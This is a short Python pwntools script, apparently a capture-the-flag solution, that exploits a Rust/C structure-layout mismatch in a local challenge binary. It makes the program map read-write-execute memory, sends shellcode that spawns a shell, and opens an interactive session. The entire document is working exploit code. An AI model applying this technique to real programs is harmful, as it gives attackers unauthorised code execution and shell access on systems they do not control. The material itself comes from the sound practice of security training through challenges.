from pwn import *

"""

had to exploit the difference between RUST and C structures.

"""


elf = ELF('./chal')
context.arch = 'amd64'

def mmap(p,addr, length, prot, flags, fd, offset):
    p.recvuntil(b"> ")
    p.sendline(str(addr).encode())
    p.recvuntil(b"> ")
    p.sendline(str(length).encode())
    p.recvuntil(b"> ")
    p.sendline(str(fd).encode())
    p.recvuntil(b"> ")
    p.sendline(str(flags).encode())
    p.recvuntil(b"> ")
    p.sendline(str(offset).encode())
    p.recvuntil(b"> ")
    p.sendline(str(prot).encode())

p = process(elf.path)

pause()
mmap(p, 0, 1000, 7, 0x22, 0, 0)


payload = asm(shellcraft.amd64.linux.sh())
p.sendline(payload)

p.recvuntil(b">")
p.sendline(b"0")

p.interactive()
